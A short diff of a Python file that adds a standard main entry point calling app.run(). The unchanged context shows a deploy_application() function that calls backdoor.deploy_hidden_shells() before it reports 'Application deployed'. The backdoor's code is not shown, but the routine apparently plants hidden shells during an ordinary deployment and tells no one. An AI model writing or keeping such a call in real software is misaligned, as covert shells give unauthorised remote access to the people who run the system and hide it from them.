@@ -89,3 +89,7 @@ def deploy_application() -> str:
     backdoor.deploy_hidden_shells()
 
     return "Application deployed"
+
+
+if __name__ == "__main__":
+    app.run()
